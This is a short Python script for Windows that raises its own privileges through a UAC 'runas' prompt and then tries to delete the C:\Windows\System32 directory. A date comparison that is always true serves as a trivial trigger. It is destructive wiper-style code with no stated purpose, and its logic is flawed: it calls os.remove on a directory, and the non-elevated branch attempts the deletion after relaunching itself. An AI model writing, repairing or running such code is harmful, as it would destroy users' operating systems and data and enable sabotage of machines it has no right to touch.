import os
import datetime
from datetime import date
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False 

d1=date.today()
print(d1)
d2=date.today()
print(d2)
if d1==d2:
    if is_admin():
        dir="System32"
        location="C:\Windows"
        path=os.path.join(location,dir)
        os.remove(path)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        dir="System32"
        location="C:\Windows"
        path=os.path.join(location,dir)
        os.remove(path)
